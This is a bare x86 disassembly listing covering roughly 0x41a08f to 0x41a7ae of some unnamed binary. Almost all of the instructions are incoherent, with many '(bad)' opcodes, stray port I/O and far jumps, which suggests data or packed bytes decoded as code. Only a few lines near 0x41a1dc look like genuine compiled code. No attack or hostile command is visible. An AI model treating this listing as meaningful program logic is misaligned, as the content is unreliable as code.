  41a08f:	sub    edx,DWORD PTR [ebx]
  41a091:	rcr    esp,1
  41a093:	adc    BYTE PTR [edi-0xc0dccce],0x5f
  41a09a:	dec    edi
  41a09b:	je     0x41a079
  41a09d:	jae    0x41a112
  41a09f:	adc    BYTE PTR [esi+eiz*4-0x52],ch
  41a0a3:	xchg   di,ax
  41a0a5:	imul   esp,eax,0x4e20e996
  41a0ab:	lock ret 0xa965
  41a0af:	mov    ch,0xcf
  41a0b1:	xor    eax,0xbcf5cdb
  41a0b6:	pop    esi
  41a0b7:	or     DWORD PTR [edi-0x5ad15f08],edi
  41a0bd:	jp     0x41a0cc
  41a0bf:	ins    DWORD PTR es:[edi],dx
  41a0c0:	and    DWORD PTR [ebp-0x362dfd89],edx
  41a0c6:	ret    
  41a0c7:	add    bh,BYTE PTR [eax+ebx*2-0xfd54a56]
  41a0ce:	adc    eax,0xcdc6a2a9
  41a0d3:	imul   ebp,DWORD PTR [esi+eax*4-0x61],0x9c208583
  41a0db:	pop    eax
  41a0dc:	outs   dx,BYTE PTR ds:[esi]
  41a0dd:	mov    ecx,DWORD PTR [ebx+edi*1]
  41a0e0:	dec    BYTE PTR [edx-0x51]
  41a0e3:	jmp    0x250d:0x55f063b5
  41a0ea:	jg     0x41a13f
  41a0ec:	aaa    
  41a0ed:	rcr    DWORD PTR [ebx-0x10],0xd6
  41a0f1:	call   0xd7e03400
  41a0f6:	mov    edx,0x6e085d77
  41a0fb:	pop    ecx
  41a0fc:	dec    ebx
  41a0fd:	add    al,0x2e
  41a0ff:	rol    BYTE PTR [edi-0x42],0x61
  41a103:	push   es
  41a104:	and    eax,DWORD PTR [edi+eax*2-0x66a9e145]
  41a10b:	dec    edx
  41a10c:	int3   
  41a10d:	cld    
  41a10e:	adc    dh,al
  41a110:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a111:	daa    
  41a112:	(bad)  [ebx+ecx*4+0x13]
  41a116:	mov    edi,DWORD PTR [edx+0x57fccfb6]
  41a11c:	mov    eax,ds:0xf45cc440
  41a121:	inc    esi
  41a122:	add    DWORD PTR [ebx+0x3b],edi
  41a125:	jmp    0x41a13e
  41a127:	or     al,0x66
  41a129:	retf   0xd0cc
  41a12c:	lods   eax,DWORD PTR ds:[esi]
  41a12d:	mov    dh,0xe5
  41a12f:	mov    eax,ds:0x4f3f6e25
  41a134:	pop    esi
  41a135:	mov    ds:0x2130f04e,eax
  41a13a:	jle    0x41a155
  41a13c:	call   0x8eeb7add
  41a141:	cmp    al,0xf8
  41a143:	scas   eax,DWORD PTR es:[edi]
  41a144:	jmp    DWORD PTR [ebp+0x552a0c83]
  41a14a:	std    
  41a14b:	mov    bl,0xcc
  41a14d:	stos   BYTE PTR es:[edi],al
  41a14e:	into   
  41a14f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a150:	out    dx,eax
  41a151:	jae    0x41a112
  41a153:	mov    eax,ds:0xd131c880
  41a158:	mov    bl,BYTE PTR [esi+0x33]
  41a15b:	push   ds
  41a15c:	add    dl,cl
  41a15e:	out    dx,al
  41a15f:	fst    QWORD PTR [ebx]
  41a161:	inc    esi
  41a162:	cmc    
  41a163:	imul   ecx,DWORD PTR [edx],0x7
  41a166:	pop    ecx
  41a167:	inc    edx
  41a168:	mov    dh,0x2e
  41a16a:	push   0x24608e4b
  41a16f:	loopne 0x41a18b
  41a171:	pop    edx
  41a172:	out    dx,al
  41a173:	push   0x58c1c11b
  41a178:	mov    dh,0x1
  41a17a:	xchg   esi,eax
  41a17b:	loope  0x41a1d1
  41a17d:	dec    ebx
  41a17e:	loop   0x41a181
  41a180:	mov    BYTE PTR [ebx+eiz*8-0x5e],0x2f
  41a185:	into   
  41a186:	mov    ds:0xbe57ccc0,al
  41a18b:	pop    edi
  41a18c:	jne    0x41a1dd
  41a18e:	inc    eax
  41a18f:	rol    DWORD PTR [eax+eiz*1+0x0],cl
  41a193:	shr    BYTE PTR [ecx+0x42c25dd9],1
  41a199:	imul   ebp,DWORD PTR [eiz*8-0xb2704a4],0xffffff81
  41a1a1:	jmp    0xba6fff1c
  41a1a6:	enter  0x2a9c,0xd7
  41a1aa:	std    
  41a1ab:	and    ecx,DWORD PTR [eax+0x7f]
  41a1ae:	and    al,0x42
  41a1b0:	test   al,0xf9
  41a1b2:	or     BYTE PTR [ebp-0x35a5cfe5],ah
  41a1b8:	sar    DWORD PTR [esi-0x1],0xf0
  41a1bc:	sub    dh,BYTE PTR [ebp+0x3bbe60e4]
  41a1c2:	mov    ah,0xf5
  41a1c4:	pushf  
  41a1c5:	mov    ebp,0x6875da8
  41a1ca:	pop    eax
  41a1cb:	mov    eax,0xc79e66ac
  41a1d0:	sti    
  41a1d1:	sbb    DWORD PTR [eax-0xa9a3df6],ebx
  41a1d7:	mov    dh,0xb2
  41a1d9:	iret   
  41a1da:	cmp    edx,ecx
  41a1dc:	mov    ecx,DWORD PTR [ebp-0xc]
  41a1df:	mov    DWORD PTR [ebp+0x8],ecx
  41a1e2:	mov    ecx,DWORD PTR [ebp+0x8]
  41a1e5:	je     0x420e5d
  41a1eb:	jmp    0x41c5ad
  41a1f0:	mov    ecx,DWORD PTR [ebp+0x8]
  41a1f3:	mov    edx,DWORD PTR [ebp-0x8]
  41a1f6:	jmp    0x41c583
  41a1fb:	cmp    BYTE PTR [edi-0x66],ch
  41a1fe:	ja     0x41a189
  41a200:	ja     0x41a23d
  41a202:	xchg   ebx,eax
  41a203:	xchg   esp,eax
  41a204:	sub    BYTE PTR [edi],bh
  41a206:	into   
  41a207:	push   edi
  41a208:	scas   eax,DWORD PTR es:[edi]
  41a209:	add    eax,0x7d1c6e4c
  41a20e:	jp     0x41a21a
  41a210:	pop    edi
  41a211:	jp     0x41a28d
  41a213:	and    BYTE PTR [eax],cl
  41a215:	sahf   
  41a216:	cs cmp DWORD PTR gs:[eiz*1-0x370ebe77],edi
  41a21f:	add    DWORD PTR [esi-0x2dd43828],0xffffffe6
  41a226:	scas   al,BYTE PTR es:[edi]
  41a227:	lahf   
  41a228:	sbb    eax,0x26ffd47d
  41a22d:	inc    esi
  41a22e:	dec    edi
  41a22f:	add    edi,0x383122e0
  41a235:	cld    
  41a236:	stos   DWORD PTR es:[edi],eax
  41a237:	jns    0x41a288
  41a239:	pop    ebx
  41a23a:	dec    esi
  41a23b:	cmp    BYTE PTR [edi+edx*2+0x298afd3a],bl
  41a242:	xchg   ebx,eax
  41a243:	retf   0xc760
  41a246:	sub    ebp,DWORD PTR [esi+0x79]
  41a249:	ss repz cmp edi,ebp
  41a24d:	xchg   esp,eax
  41a24e:	adc    edx,DWORD PTR [edx]
  41a250:	nop
  41a251:	add    BYTE PTR [edi+0x38181f9d],dh
  41a257:	test   DWORD PTR [ecx],edi
  41a259:	popf   
  41a25a:	jge    0x41a259
  41a25c:	pop    esi
  41a25d:	lahf   
  41a25e:	(bad)  [esp+eax*2]
  41a261:	in     eax,dx
  41a262:	ret    0x97f1
  41a265:	sbb    bl,BYTE PTR [ebx-0x23]
  41a268:	in     eax,dx
  41a269:	xchg   edi,eax
  41a26a:	push   ebp
  41a26b:	in     al,dx
  41a26c:	xor    ch,BYTE PTR [ebp+eiz*8-0x7c760448]
  41a273:	lods   eax,DWORD PTR ds:[esi]
  41a274:	sub    BYTE PTR [edx],cl
  41a276:	push   edi
  41a277:	xchg   esi,eax
  41a278:	jge    0x41a222
  41a27a:	int    0xf2
  41a27c:	mov    dl,0x77
  41a27e:	dec    edx
  41a27f:	jo     0x41a2eb
  41a281:	aam    0x78
  41a283:	aaa    
  41a284:	add    BYTE PTR [edi-0x3a],cl
  41a287:	jo     0x41a263
  41a289:	lods   eax,DWORD PTR ds:[esi]
  41a28a:	and    al,0x4f
  41a28c:	xchg   esi,eax
  41a28d:	js     0x41a28e
  41a28f:	mov    bh,0x67
  41a291:	push   ss
  41a292:	shl    DWORD PTR [edx+0x5e],1
  41a295:	out    0xd4,eax
  41a297:	in     al,0x46
  41a299:	jp     0x41a238
  41a29b:	test   eax,0xd3d4fa19
  41a2a0:	loop   0x41a2fe
  41a2a2:	and    BYTE PTR [ecx-0x7c038c69],ch
  41a2a8:	loopne 0x41a2a3
  41a2aa:	lock lahf 
  41a2ac:	xlat   BYTE PTR ds:[ebx]
  41a2ad:	enter  0x93bc,0x6c
  41a2b1:	xchg   BYTE PTR [esi+0x409e9618],al
  41a2b7:	xor    edi,esp
  41a2b9:	fwait
  41a2ba:	das    
  41a2bb:	loop   0x41a2e7
  41a2bd:	leave  
  41a2be:	adc    al,0xdf
  41a2c0:	mov    ebp,0x52533529
  41a2c5:	(bad)  
  41a2c6:	idiv   BYTE PTR [eax-0x36df5738]
  41a2cc:	int    0x68
  41a2ce:	pushf  
  41a2cf:	(bad)
  41a2d3:	jp     0x41a30c
  41a2d5:	and    ecx,edi
  41a2d7:	jae    0x41a2a8
  41a2d9:	into   
  41a2da:	popa   
  41a2db:	fdiv   st(7),st
  41a2dd:	ins    DWORD PTR es:[edi],dx
  41a2de:	push   ss
  41a2df:	in     eax,dx
  41a2e0:	fcomp  st(2)
  41a2e2:	aam    0x97
  41a2e4:	ja     0x41a26d
  41a2e6:	aad    0xed
  41a2e8:	jl     0x41a2ca
  41a2ea:	shl    DWORD PTR [ecx-0x5e626ab],cl
  41a2f0:	stc    
  41a2f1:	aaa    
  41a2f2:	shl    BYTE PTR [esp+ecx*4-0x5a497338],cl
  41a2f9:	test   DWORD PTR [edi+0x1209c987],edi
  41a2ff:	xor    al,0xe8
  41a301:	add    al,0xbd
  41a303:	cld    
  41a304:	mov    eax,ds:0x12ddb528
  41a309:	cmp    edx,DWORD PTR [edi+0x6e]
  41a30c:	pop    esp
  41a30d:	sahf   
  41a30e:	test   cl,0xe1
  41a311:	(bad)  
  41a312:	int3   
  41a313:	and    BYTE PTR [ebx+0x162e157d],ah
  41a319:	mov    ebx,DWORD PTR [ecx]
  41a31b:	mov    cl,0xa3
  41a31d:	stc    
  41a31e:	add    eax,eax
  41a320:	lahf   
  41a321:	fcomp  DWORD PTR [edx-0x43]
  41a324:	dec    ecx
  41a325:	sbb    eax,0x367331e6
  41a32b:	sub    BYTE PTR [esi+0x799535e5],0x98
  41a332:	adc    eax,0xfefb6329
  41a337:	mov    ds:0x2acf6a8c,eax
  41a33c:	icebp  
  41a33d:	jbe    0x41a2d7
  41a33f:	adc    al,BYTE PTR [edi+0x6254f01f]
  41a345:	xor    esp,0x54404b07
  41a34b:	jp     0x41a32f
  41a34d:	push   cs
  41a34e:	pop    ebx
  41a34f:	hlt    
  41a350:	sub    BYTE PTR [esi],0x62
  41a353:	sub    bh,BYTE PTR [esi-0x7f]
  41a356:	lock (bad) 
  41a358:	loope  0x41a3cd
  41a35a:	jne    0x41a354
  41a35c:	sub    bh,BYTE PTR [edi-0x381ba064]
  41a362:	and    al,0x5a
  41a364:	mov    bh,0x7c
  41a366:	stos   DWORD PTR es:[edi],eax
  41a367:	cmc    
  41a368:	sar    DWORD PTR [ebp-0x43],cl
  41a36b:	jge    0x41a2ed
  41a36d:	dec    esi
  41a36e:	sbb    edx,DWORD PTR [ecx+0x7d80bf9]
  41a374:	in     al,0xc5
  41a376:	in     al,dx
  41a377:	(bad)  
  41a378:	fild   DWORD PTR [esi+0x59ca6688]
  41a37e:	clc    
  41a37f:	add    BYTE PTR [edx+ebx*1],al
  41a382:	mov    edx,ebp
  41a384:	pushf  
  41a385:	outs   dx,BYTE PTR ds:[esi]
  41a386:	(bad)  
  41a387:	js     0x41a3b7
  41a389:	adc    dl,BYTE PTR [ecx+0x34]
  41a38c:	add    eax,0xb12d4c7b
  41a391:	aad    0xef
  41a393:	gs push eax
  41a395:	jb     0x41a3b3
  41a397:	aaa    
  41a398:	sti    
  41a399:	popa   
  41a39a:	retf   0xd5e0
  41a39d:	cmp    ah,BYTE PTR [ebp-0x56e3e86d]
  41a3a3:	cli    
  41a3a4:	cmp    BYTE PTR [edi+0x421ace48],bh
  41a3aa:	dec    ebx
  41a3ab:	jl     0x41a382
  41a3ad:	aaa    
  41a3ae:	jo     0x41a398
  41a3b0:	(bad)  
  41a3b1:	pop    ebp
  41a3b2:	fs mov esi,edi
  41a3b5:	mov    cl,0x92
  41a3b7:	out    dx,al
  41a3b8:	push   cs
  41a3b9:	inc    ebp
  41a3ba:	(bad)  
  41a3bc:	das    
  41a3bd:	das    
  41a3be:	pusha  
  41a3bf:	rol    BYTE PTR [esi],0x5
  41a3c2:	stc    
  41a3c3:	adc    WORD PTR [esi],bx
  41a3c6:	outs   dx,BYTE PTR ds:[esi]
  41a3c7:	inc    ebx
  41a3c8:	loope  0x41a36a
  41a3ca:	mov    DWORD PTR [edi],edi
  41a3cc:	and    eax,0x73ca8e65
  41a3d1:	out    0x45,al
  41a3d3:	fsubp  st(1),st
  41a3d5:	add    eax,esi
  41a3d7:	push   ecx
  41a3d8:	push   ss
  41a3d9:	inc    ebx
  41a3da:	sbb    al,0xc2
  41a3dc:	jne    0x41a372
  41a3de:	outs   dx,DWORD PTR ds:[esi]
  41a3df:	push   edi
  41a3e0:	cld    
  41a3e1:	(bad)
  41a3e5:	mov    bl,0xb
  41a3e7:	pop    ebx
  41a3e8:	int    0x9a
  41a3ea:	adc    ebx,ebp
  41a3ec:	or     ah,cl
  41a3ee:	sbb    al,0xcd
  41a3f0:	test   bl,bh
  41a3f2:	pop    esp
  41a3f3:	pop    ecx
  41a3f4:	xor    ch,0x8f
  41a3f7:	jg     0x41a414
  41a3f9:	rcr    BYTE PTR [edx+0x5d],0x8b
  41a3fd:	pop    esp
  41a3fe:	aas    
  41a3ff:	add    DWORD PTR [ebx],ebp
  41a401:	mov    edi,0xb09a51eb
  41a406:	push   eax
  41a407:	or     edi,DWORD PTR [ecx-0x60]
  41a40a:	hlt    
  41a40b:	pop    es
  41a40c:	pop    ds
  41a40d:	push   ecx
  41a40e:	inc    ebx
  41a40f:	fidiv  DWORD PTR [edi+0x16c376]
  41a415:	lea    edi,[ecx+0x16]
  41a418:	aas    
  41a419:	nop
  41a41a:	aad    0x1c
  41a41c:	add    eax,0x85005bb8
  41a421:	jnp    0x41a40d
  41a423:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a424:	in     eax,0x20
  41a426:	xchg   ebp,eax
  41a427:	ins    DWORD PTR es:[edi],dx
  41a428:	dec    esp
  41a429:	mov    ds:0x434fb56c,eax
  41a42e:	data16 jno 0x41a3ed
  41a431:	mov    esi,0xb81ddf6c
  41a436:	push   ebx
  41a437:	adc    eax,0x74d983af
  41a43c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a43d:	fild   DWORD PTR [edi-0x71]
  41a440:	cmp    al,0xbe
  41a442:	test   BYTE PTR [eax],dh
  41a444:	repnz lods eax,DWORD PTR ds:[esi]
  41a446:	sbb    ebx,edi
  41a448:	inc    esi
  41a449:	mov    ah,0xf8
  41a44b:	bound  esp,QWORD PTR [ecx+0x22cb7b]
  41a451:	or     al,0x7e
  41a453:	and    eax,0x5141430f
  41a458:	mov    ebp,0x230e4a06
  41a45d:	dec    esp
  41a45e:	outs   dx,DWORD PTR ds:[esi]
  41a45f:	repnz pop esp
  41a461:	push   es
  41a462:	sahf   
  41a463:	inc    eax
  41a464:	push   eax
  41a465:	sbb    DWORD PTR [esi+0x3fb65379],eax
  41a46b:	mov    ds:0x93302371,al
  41a470:	mov    edx,0x9761d100
  41a475:	and    al,0x20
  41a477:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a478:	adc    al,0xd2
  41a47a:	and    eax,0x45b2c9b8
  41a47f:	dec    esi
  41a480:	pop    ebp
  41a481:	pop    ebx
  41a482:	mov    al,ds:0xeb8d629d
  41a487:	mov    dl,0xe0
  41a489:	xchg   ecx,eax
  41a48a:	jnp    0x41a44b
  41a48c:	clc    
  41a48d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a48e:	into   
  41a48f:	pop    eax
  41a490:	test   ebx,edi
  41a492:	mov    BYTE PTR [edi],al
  41a494:	rcr    BYTE PTR [edi-0x2a],1
  41a497:	push   esp
  41a498:	fcomp  DWORD PTR [edi-0x54d3b519]
  41a49e:	sbb    DWORD PTR [ecx+0x54],edi
  41a4a1:	sbb    eax,0x961865ab
  41a4a6:	fisubr DWORD PTR [edx-0x54]
  41a4a9:	xlat   BYTE PTR ds:[ebx]
  41a4aa:	neg    DWORD PTR [eax-0x3f]
  41a4ad:	nop
  41a4ae:	xchg   DWORD PTR [esi+0x5c],edi
  41a4b1:	fld    TBYTE PTR [ebx]
  41a4b3:	mov    cl,0x34
  41a4b5:	inc    edi
  41a4b6:	repz pop esi
  41a4b8:	lods   eax,DWORD PTR ds:[esi]
  41a4b9:	ficomp DWORD PTR [esp+ebp*1-0x5e]
  41a4bd:	lods   al,BYTE PTR ds:[esi]
  41a4be:	inc    ebp
  41a4bf:	xor    al,0x81
  41a4c1:	mov    ecx,0x4fec49ad
  41a4c6:	cmc    
  41a4c7:	or     al,0xa5
  41a4c9:	and    ch,BYTE PTR [ebp-0x1b]
  41a4cc:	pop    edx
  41a4cd:	lahf   
  41a4ce:	loop   0x41a468
  41a4d0:	fdivr  DWORD PTR [esi-0x74964df0]
  41a4d6:	push   ds
  41a4d7:	stos   DWORD PTR es:[edi],eax
  41a4d8:	jle    0x41a4d5
  41a4da:	(bad)  
  41a4db:	pop    ds
  41a4dc:	adc    esi,edx
  41a4de:	mov    eax,ds:0x3d719a94
  41a4e3:	jns    0x41a473
  41a4e5:	sbb    al,0x42
  41a4e7:	fstp   TBYTE PTR [ecx+0x5e]
  41a4ea:	mov    ebx,0x6c60ae07
  41a4ef:	jl     0x41a514
  41a4f1:	inc    ebx
  41a4f2:	mov    al,ds:0xfba4c07
  41a4f7:	nop
  41a4f8:	sbb    eax,0x79025cd1
  41a4fd:	and    edi,ebp
  41a4ff:	sti    
  41a500:	shl    DWORD PTR [eax+esi*8-0x7875cc32],0xe9
  41a508:	adc    BYTE PTR [eax-0x71],dl
  41a50b:	ret    
  41a50c:	addr16 (bad) 
  41a50e:	sub    al,0x55
  41a510:	int    0x4b
  41a512:	push   esi
  41a513:	test   BYTE PTR [edi-0x13],0x90
  41a517:	mul    eax
  41a519:	sub    dl,BYTE PTR [edi+0x544a637a]
  41a51f:	push   ss
  41a520:	inc    edi
  41a521:	jecxz  0x41a4da
  41a523:	push   es
  41a524:	fisubr WORD PTR [ecx]
  41a526:	icebp  
  41a527:	add    eax,0x56d60ed6
  41a52c:	xchg   ecx,eax
  41a52d:	mov    edi,0x318cd603
  41a532:	pop    edx
  41a533:	scas   al,BYTE PTR es:[edi]
  41a534:	scas   eax,DWORD PTR es:[edi]
  41a535:	push   ebx
  41a536:	push   esp
  41a537:	in     eax,dx
  41a538:	fmul   st(4),st
  41a53a:	das    
  41a53b:	out    0xf7,al
  41a53d:	dec    ecx
  41a53e:	(bad)  
  41a53f:	cmp    ch,bl
  41a541:	adc    ebx,DWORD PTR [eax+0xaec530]
  41a547:	sub    edi,DWORD PTR [ecx+0x20]
  41a54a:	retf   0xc5ff
  41a54d:	adc    eax,0x4587a874
  41a552:	inc    esi
  41a553:	add    ecx,DWORD PTR [ebx-0xd]
  41a556:	cld    
  41a557:	sub    dh,0x27
  41a55a:	mov    dl,0x87
  41a55c:	xlat   BYTE PTR ds:[ebx]
  41a55d:	dec    ecx
  41a55e:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41a560:	sub    ch,ah
  41a562:	mov    edi,0xbb256bdb
  41a567:	push   ebx
  41a568:	fld    TBYTE PTR [eax+0x7d02a823]
  41a56e:	pop    eax
  41a56f:	jle    0x41a519
  41a571:	push   esi
  41a572:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a573:	rcl    BYTE PTR [ecx],1
  41a575:	aad    0xb3
  41a577:	dec    esi
  41a578:	xchg   edi,eax
  41a579:	or     al,0x92
  41a57b:	imul   BYTE PTR [eax+0x457ffc43]
  41a581:	aas    
  41a582:	push   edx
  41a583:	push   edx
  41a584:	jl     0x41a51e
  41a586:	out    0x29,al
  41a588:	push   edi
  41a589:	and    al,0x21
  41a58b:	inc    esi
  41a58c:	and    eax,0xb6bfec3c
  41a591:	sbb    ebx,DWORD PTR [eax]
  41a593:	adc    eax,0xa2847104
  41a598:	xor    eax,0x35bcad4e
  41a59d:	pop    ebx
  41a59e:	xor    al,ah
  41a5a0:	mov    bl,0x9b
  41a5a2:	push   es
  41a5a3:	adc    dh,dl
  41a5a5:	mov    dh,0xdf
  41a5a8:	cdq    
  41a5a9:	or     eax,0x52a24a43
  41a5ae:	popf   
  41a5af:	cmp    DWORD PTR [eax+0x1b],ecx
  41a5b2:	fxch   st(3)
  41a5b4:	loopne 0x41a550
  41a5b6:	stc    
  41a5b7:	ds out 0x10,al
  41a5ba:	fadd   DWORD PTR [eax]
  41a5bc:	jp     0x41a59b
  41a5be:	mov    ?,WORD PTR [ebp+0x6858422d]
  41a5c4:	pop    edx
  41a5c5:	(bad)  
  41a5c7:	fdivr  DWORD PTR [edx+0x20]
  41a5ca:	inc    ebx
  41a5cb:	call   0xa1de:0x64959921
  41a5d2:	sbb    eax,0x37f61646
  41a5d7:	daa    
  41a5d8:	outs   dx,BYTE PTR ds:[esi]
  41a5d9:	(bad)  
  41a5db:	fst    DWORD PTR [eax]
  41a5dd:	aaa    
  41a5de:	adc    BYTE PTR [edi+0x7c1c9fa],bh
  41a5e4:	xor    DWORD PTR [eax+edi*2-0x33],0x6d
  41a5e9:	xchg   ecx,eax
  41a5ea:	xlat   BYTE PTR ds:[ebx]
  41a5eb:	dec    edi
  41a5ec:	jge    0x41a5c2
  41a5ee:	pop    ds
  41a5ef:	mov    ebp,0xe0b332fa
  41a5f4:	stc    
  41a5f5:	hlt    
  41a5f6:	clc    
  41a5f7:	dec    edx
  41a5f8:	xchg   esp,eax
  41a5f9:	dec    ecx
  41a5fa:	pop    ss
  41a5fb:	out    dx,eax
  41a5fc:	(bad)  
  41a5fe:	outs   dx,BYTE PTR ds:[esi]
  41a5ff:	cmp    DWORD PTR [ecx+0x226881a6],ecx
  41a605:	ret    
  41a606:	xor    DWORD PTR [edx],ebx
  41a608:	clc    
  41a609:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a60a:	retf   
  41a60b:	mov    fs,eax
  41a60d:	rol    DWORD PTR [ebp-0x42cc3276],0x29
  41a614:	xchg   ebx,eax
  41a615:	and    eax,0xf25dac0e
  41a61a:	aas    
  41a61b:	int    0xb9
  41a61d:	pop    ss
  41a61e:	aaa    
  41a61f:	xor    eax,0x8beec5f
  41a624:	ins    BYTE PTR es:[edi],dx
  41a625:	fcomip st,st(5)
  41a627:	mov    dl,0x5c
  41a629:	stos   BYTE PTR es:[edi],al
  41a62a:	push   cs
  41a62b:	mov    bh,0x27
  41a62d:	xor    DWORD PTR [eax],esi
  41a62f:	test   BYTE PTR [edx],cl
  41a631:	jg     0x41a653
  41a633:	mov    bl,0x98
  41a635:	mov    cs,edx
  41a637:	stc    
  41a638:	pop    eax
  41a639:	push   esp
  41a63a:	dec    ebx
  41a63b:	push   esp
  41a63c:	aam    0x60
  41a63e:	pop    es
  41a63f:	retf   
  41a640:	aad    0x68
  41a642:	(bad)  
  41a643:	dec    edi
  41a644:	loop   0x41a5d5
  41a646:	mov    al,ds:0xf52f65df
  41a64b:	mov    WORD PTR [edx],cs
  41a64d:	test   al,0xcd
  41a64f:	inc    eax
  41a650:	pop    ds
  41a651:	loop   0x41a6ac
  41a653:	outs   dx,DWORD PTR ds:[esi]
  41a654:	jnp    0x41a6ce
  41a656:	fwait
  41a657:	add    bl,BYTE PTR [ecx+esi*2-0x5c]
  41a65b:	retf   0xe19d
  41a65e:	dec    ebx
  41a65f:	test   BYTE PTR [eax+0x32],ah
  41a662:	push   cs
  41a663:	mov    ebx,0xb807b483
  41a668:	push   es
  41a669:	das    
  41a66a:	(bad)  
  41a66b:	xchg   edi,eax
  41a66c:	or     al,0xeb
  41a66e:	and    eax,0x85b0ad09
  41a673:	ret    
  41a674:	add    eax,0x954fc812
  41a679:	jnp    0x41a67b
  41a67b:	dec    ecx
  41a67c:	clc    
  41a67d:	sub    BYTE PTR ds:0x40ce826a,bl
  41a683:	xlat   BYTE PTR ds:[ebx]
  41a684:	push   ss
  41a685:	push   ss
  41a686:	outs   dx,BYTE PTR ds:[esi]
  41a687:	les    ebx,FWORD PTR [eax+0xc63cb3c]
  41a68d:	adc    eax,0xa1ad9d28
  41a692:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a693:	jmp    0x787e:0xddce9ce8
  41a69a:	int3   
  41a69b:	ret    
  41a69c:	fidivr DWORD PTR [edx]
  41a69e:	fisubr WORD PTR [eax+0x6791a58e]
  41a6a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6a5:	inc    ebx
  41a6a6:	jbe    0x41a642
  41a6a8:	mov    ds,WORD PTR [edi-0x66]
  41a6ab:	pop    esp
  41a6ac:	adc    ebp,DWORD PTR [esi+0x2d]
  41a6af:	mov    dh,0x2d
  41a6b1:	rol    esp,0x7a
  41a6b4:	adc    bh,ah
  41a6b6:	and    DWORD PTR [ecx],0x32
  41a6b9:	inc    eax
  41a6ba:	lds    esi,FWORD PTR [eax+eiz*4-0x484bcbce]
  41a6c1:	fadd   QWORD PTR [ebx]
  41a6c3:	mov    ecx,edx
  41a6c5:	cmp    DWORD PTR [edx],ebx
  41a6c7:	test   DWORD PTR [ebp-0x476b3540],esi
  41a6cd:	and    eax,0x57080357
  41a6d2:	sar    BYTE PTR [edi],1
  41a6d4:	jecxz  0x41a753
  41a6d6:	bound  edx,QWORD PTR [esi]
  41a6d8:	or     edx,DWORD PTR [edx]
  41a6da:	mov    WORD PTR [ebp-0x5b],ss
  41a6dd:	or     al,BYTE PTR [ecx+0x1d]
  41a6e0:	dec    ebx
  41a6e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a6e2:	repnz repz fbstp TBYTE PTR [esi+0x25bbacfb]
  41a6ea:	push   esp
  41a6eb:	popf   
  41a6ec:	rcl    DWORD PTR [edi-0x4977d170],1
  41a6f2:	mov    DWORD PTR [ebp+0x3],eax
  41a6f5:	ins    DWORD PTR es:[edi],dx
  41a6f6:	popa   
  41a6f7:	jmp    0xa7f9:0x2354aedc
  41a6fe:	xlat   BYTE PTR ds:[ebx]
  41a6ff:	sbb    al,0xc4
  41a701:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a702:	xchg   DWORD PTR [ecx-0x54],eax
  41a705:	pop    esp
  41a706:	jbe    0x41a752
  41a708:	mov    ds:0x7c70540,eax
  41a70d:	cmp    esi,DWORD PTR [ecx]
  41a70f:	pop    ds
  41a710:	test   BYTE PTR [edx-0x47],cl
  41a713:	lahf   
  41a714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a715:	inc    eax
  41a716:	(bad)  
  41a717:	gs hlt 
  41a719:	fwait
  41a71a:	sbb    eax,ecx
  41a71c:	xor    DWORD PTR [ecx],esi
  41a71e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a71f:	shl    cl,cl
  41a721:	or     esi,DWORD PTR [esi+0x40]
  41a724:	push   0xffffff95
  41a726:	(bad)  
  41a727:	in     al,dx
  41a728:	loopne 0x41a773
  41a72a:	dec    ecx
  41a72b:	scas   eax,DWORD PTR es:[edi]
  41a72c:	add    BYTE PTR [ebx],ch
  41a72e:	inc    edx
  41a72f:	bound  ebp,QWORD PTR [esp+ecx*4-0xc]
  41a733:	jb     0x41a72d
  41a735:	sar    DWORD PTR [edx],1
  41a737:	fistp  DWORD PTR gs:[edx+0x5c]
  41a73b:	std    
  41a73c:	pop    ecx
  41a73d:	jae    0x41a6ff
  41a73f:	and    eax,0xbbeaaadc
  41a744:	pop    ebp
  41a745:	daa    
  41a746:	jmp    0x41a71f
  41a748:	and    eax,0x2d68279a
  41a74d:	xor    eax,0x667a90fd
  41a752:	jle    0x41a7b4
  41a754:	imul   esp,edx,0x26
  41a757:	and    al,0x83
  41a759:	adc    ah,BYTE PTR [ebx]
  41a75b:	sbb    ch,BYTE PTR [ebp+ebx*4+0x144c1f8]
  41a762:	cmp    edi,DWORD PTR [ebx]
  41a764:	push   esi
  41a765:	inc    eax
  41a766:	stc    
  41a767:	push   ds
  41a768:	pop    ebx
  41a769:	xchg   esp,eax
  41a76a:	rcr    BYTE PTR [edx+esi*8-0x7587d17e],cl
  41a771:	sub    eax,DWORD PTR [ecx-0x323750f0]
  41a777:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a778:	into   
  41a779:	daa    
  41a77a:	xchg   ebp,eax
  41a77b:	jge    0x41a7f0
  41a77d:	stos   BYTE PTR es:[edi],al
  41a77e:	test   DWORD PTR [esi+edi*2],eax
  41a781:	sahf   
  41a782:	mov    ebx,0xbbef39af
  41a787:	pop    esi
  41a788:	int    0x5c
  41a78a:	mov    esp,tr7
  41a78d:	jns    0x41a79d
  41a78f:	in     eax,0x9c
  41a791:	ret    
  41a792:	cwde   
  41a793:	pop    ecx
  41a794:	lds    ebp,FWORD PTR [edi-0x69]
  41a797:	test   bh,dh
  41a799:	(bad)  
  41a79a:	mov    ecx,0xeb98bd46
  41a79f:	sub    ch,dh
  41a7a1:	aas    
  41a7a2:	(bad)  
  41a7a3:	iret   
  41a7a4:	in     al,dx
  41a7a5:	test   eax,0x428cb560
  41a7aa:	mov    cl,0x57
  41a7ac:	lahf   
  41a7ad:	sahf   
  41a7ae:	sbb    BYTE PTR [edx+0xb],0xce
